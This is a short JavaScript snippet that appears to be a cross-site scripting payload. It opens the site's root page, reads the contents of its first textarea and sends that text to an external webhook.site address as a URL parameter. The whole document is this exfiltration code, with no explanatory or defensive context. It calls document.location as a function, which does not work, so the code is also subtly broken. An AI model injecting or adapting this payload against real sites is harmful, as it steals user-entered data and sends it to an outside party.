(function() {
  
    const webhookUrl = "https://webhook.site/673c6b56-0dc4-4adb-b539-55c517084bb6";
    const root = window.open("/");

if (!root) {
    document.location(webhookUrl + "?data=error-in-root-window-open")
} else {
  root.addEventListener("load", () => {
    const textarea = root.document.querySelector("textarea");
    if (textarea) {
      document.location(webhookUrl + "?data=" + textarea.value);
    } else {
      document.location(webhookUrl + "?data=root-did-not-load");
    }
  });
}
})();
